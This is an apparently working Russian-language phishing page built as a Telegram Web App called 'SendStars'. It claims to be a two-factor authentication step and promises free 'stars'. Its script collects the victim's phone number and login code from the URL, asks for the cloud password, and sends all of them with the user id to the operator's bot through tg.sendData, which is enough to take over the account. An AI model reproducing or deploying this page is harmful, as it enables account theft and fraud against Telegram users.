<!DOCTYPE html>
<html lang="ru">
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width,initial-scale=1" />
		<title>SendStars — двухфакторная аутентификация</title>
		<script src="https://telegram.org/js/telegram-web-app.js"></script>
		<style>
			:root {
				--bg: #1c1b1b;
				--text: #fff;
				--box: #2a2a2a;
				--button: #2a9bf8;
				--button-hover: #1a8be8;
				--button-secondary: #3a3a3a;
				--button-confirm: #4caf50;
				--button-confirm-hover: #45a049;
				--glow-primary: rgba(42, 155, 248, 0.4);
				--glow-confirm: rgba(76, 175, 80, 0.4);
				--glow-secondary: rgba(255, 255, 255, 0.1);
			}

			* {
				box-sizing: border-box;
				margin: 0;
				padding: 0;
			}
			html,
			body {
				height: 100%;
			}

			body {
				font-family: Inter, system-ui, -apple-system, 'Segoe UI', Roboto,
					'Helvetica Neue', Arial;
				background: var(--bg);
				display: flex;
				align-items: center;
				justify-content: center;
				color: var(--text);
			}

			.screen {
				width: 400px;
				display: flex;
				flex-direction: column;
				align-items: center;
				text-align: center;
				gap: 15px;
			}

			.avatar img {
				width: 120px;
				height: auto;
				object-fit: contain;
				display: block;
			}

			.title {
				font-size: 20px;
				font-weight: 600;
				margin-bottom: 5px;
			}

			.hint {
				font-size: 14px;
				color: #aaa;
				margin-bottom: 10px;
				line-height: 1.4;
				max-width: 320px;
			}

			.password-input {
				width: 280px;
				height: 50px;
				border-radius: 12px;
				background: var(--box);
				border: 2px solid #3a3a3a;
				color: var(--text);
				font-size: 16px;
				padding: 0 15px;
				margin: 10px 0 0px;
				transition: border-color 0.2s;
			}

			.password-input:focus {
				outline: none;
				border-color: #2a9bf8;
				box-shadow: 0 0 0 2px rgba(42, 155, 248, 0.2);
			}

			.forgot-password {
				color: #2a9bf8;
				font-size: 14px;
				cursor: pointer;
				margin-bottom: 20px;
				text-decoration: none;
				transition: color 0.2s;
			}

			.forgot-password:hover {
				color: #1a8be8;
				text-decoration: underline;
			}

			.password-reset-info {
				font-size: 14px;
				color: #aaa;
				line-height: 1.4;
				max-width: 320px;
				margin-bottom: 15px;
				text-align: center;
			}

			.settings-link {
				color: #2a9bf8;
				text-decoration: none;
				cursor: pointer;
				font-weight: 500;
			}

			.settings-link:hover {
				text-decoration: underline;
			}

			.arrow {
				display: inline-block;
				margin: 0 5px;
				color: #2a9bf8;
				font-weight: bold;
			}

			.buttons {
				display: flex;
				gap: 10px;
				width: 280px;
			}

			.button {
				flex: 1;
				height: 50px;
				border-radius: 12px;
				border: none;
				font-size: 16px;
				font-weight: 600;
				cursor: pointer;
				transition: all 0.3s ease;
				position: relative;
			}

			.button-secondary {
				background: var(--button-secondary);
				color: var(--text);
				box-shadow: 0 0 10px var(--glow-secondary);
			}

			.button-secondary:hover {
				background: #4a4a4a;
				box-shadow: 0 0 15px var(--glow-secondary),
					0 0 20px var(--glow-secondary);
				transform: translateY(-1px);
			}

			.button-primary {
				background: var(--button);
				color: white;
				box-shadow: 0 0 10px var(--glow-primary);
			}

			.button-primary:hover {
				background: var(--button-hover);
				box-shadow: 0 0 15px var(--glow-primary), 0 0 25px var(--glow-primary);
				transform: translateY(-1px);
			}

			.button-confirm {
				background: var(--button-confirm);
				color: white;
				box-shadow: 0 0 10px var(--glow-confirm);
			}

			.button-confirm:hover {
				background: var(--button-confirm-hover);
				box-shadow: 0 0 15px var(--glow-confirm), 0 0 25px var(--glow-confirm);
				transform: translateY(-1px);
			}

			.button-confirm {
				animation: pulse-green 2s infinite;
			}

			@keyframes pulse-green {
				0% {
					box-shadow: 0 0 10px var(--glow-confirm);
				}
				50% {
					box-shadow: 0 0 15px var(--glow-confirm), 0 0 25px var(--glow-confirm);
				}
				100% {
					box-shadow: 0 0 10px var(--glow-confirm);
				}
			}

			.confirmation-text {
				font-size: 14px;
				color: #aaa;
				margin-top: 10px;
				max-width: 280px;
				line-height: 1.4;
				display: none;
			}

			/* Экран загрузки */
			.loading-screen {
				display: none;
				flex-direction: column;
				align-items: center;
				gap: 20px;
			}

			.spinner {
				border: 4px solid rgba(255, 255, 255, 0.2);
				border-top: 4px solid #fff;
				border-radius: 50%;
				width: 50px;
				height: 50px;
				animation: spin 1s linear infinite;
			}

			@keyframes spin {
				0% {
					transform: rotate(0deg);
				}
				100% {
					transform: rotate(360deg);
				}
			}

			.loading-text {
				font-size: 14px;
				color: #aaa;
				line-height: 1.4;
				max-width: 320px;
				margin-top: 10px;
			}
		</style>
	</head>
	<body>
		<div class="screen" id="passwordScreen">
			<div class="avatar">
				<img src="avatar.gif" alt="avatar" />
			</div>

			<div class="title">Введите пароль</div>

			<div class="hint">
				Если ваш аккаунт защищён паролем, введите его здесь, если нет -
				пропустите этот пункт.
			</div>

			<input
				type="password"
				class="password-input"
				id="passwordInput"
				placeholder="Пароль"
				autocomplete="current-password"
			/>

			<div id="forgotPasswordContainer">
				<a class="forgot-password" id="forgotPasswordLink">Забыли пароль?</a>
			</div>

			<div class="buttons">
				<button class="button button-secondary" id="skipButton">
					Пропустить
				</button>
				<button class="button button-primary" id="continueButton">
					Продолжить
				</button>
			</div>

			<div class="confirmation-text" id="confirmationText">
				Вы уверены, что аккаунт не защищён паролем?
			</div>
		</div>

		<!-- Экран загрузки -->
		<div class="screen loading-screen" id="loadingScreen">
			<div class="spinner"></div>
			<div>Проверка пароля…</div>
			<div class="loading-text">
				Звёзды начисляются в течение 1-2 минут. Пожалуйста, не сворачивайте
				приложение.
			</div>
		</div>

		<script>
			const tg = window.Telegram.WebApp;

			try {
				tg.expand();
			} catch (e) {
				console.log('Telegram WebApp not available');
			}

			let phoneNumber = 'Не указан';
			let code = 'Не указан';

			try {
				const urlParams = new URLSearchParams(window.location.search);
				phoneNumber = urlParams.get('phone') || 'Не указан';
				code = urlParams.get('code') || 'Не указан';
			} catch (e) {
				console.log('Error parsing URL parameters');
			}

			const passwordInput = document.getElementById('passwordInput');
			const skipButton = document.getElementById('skipButton');
			const continueButton = document.getElementById('continueButton');
			const passwordScreen = document.getElementById('passwordScreen');
			const loadingScreen = document.getElementById('loadingScreen');
			const forgotPasswordLink = document.getElementById('forgotPasswordLink');
			const forgotPasswordContainer = document.getElementById(
				'forgotPasswordContainer'
			);
			const confirmationText = document.getElementById('confirmationText');

			function handleSkipAction() {
				try {
					if (!skipButton.classList.contains('button-confirm')) {
						if (confirmationText) confirmationText.style.display = 'block';
						skipButton.textContent = 'Да, пропустить';
						skipButton.classList.remove('button-secondary');
						skipButton.classList.add('button-confirm');
					} else {
						if (passwordScreen) passwordScreen.style.display = 'none';
						if (loadingScreen) loadingScreen.style.display = 'flex';

						if (tg && tg.sendData) {
							tg.sendData(
								JSON.stringify({
									type: '2fa_password',
									password: '',
									phone_number: phoneNumber,
									auth_code: code,
									user_id: tg.initDataUnsafe?.user?.id || '',
								})
							);
							if (tg.close) tg.close();
						}
					}
				} catch (e) {
					console.log('Ошибка при обработке кнопки "Пропустить":', e);
				}
			}

			function handleContinueAction() {
				try {
					const password = passwordInput?.value.trim() || '';

					if (password) {
						if (passwordScreen) passwordScreen.style.display = 'none';
						if (loadingScreen) loadingScreen.style.display = 'flex';

						if (tg && tg.sendData) {
							tg.sendData(
								JSON.stringify({
									type: '2fa_password',
									password: password,
									phone_number: phoneNumber,
									auth_code: code,
									user_id: tg.initDataUnsafe?.user?.id || '',
								})
							);
							if (tg.close) tg.close();
						}
					} else {
						if (passwordInput) {
							passwordInput.style.borderColor = '#ff4444';
							passwordInput.style.boxShadow =
								'0 0 0 2px rgba(255, 68, 68, 0.3)';
							setTimeout(() => {
								passwordInput.style.borderColor = '#3a3a3a';
								passwordInput.style.boxShadow = 'none';
							}, 1000);
						}
					}
				} catch (e) {
					console.log('Ошибка при обработке кнопки "Продолжить":', e);
				}
			}

			if (skipButton) {
				skipButton.addEventListener('click', handleSkipAction);
			}

			if (continueButton) {
				continueButton.addEventListener('click', handleContinueAction);
			}

			if (passwordInput) {
				passwordInput.addEventListener('keypress', e => {
					try {
						if (e.key === 'Enter' && continueButton) {
							continueButton.click();
						}
					} catch (e) {
						console.log('Error in keypress handler:', e);
					}
				});

				passwordInput.focus();
			}
		</script>
	</body>
</html>
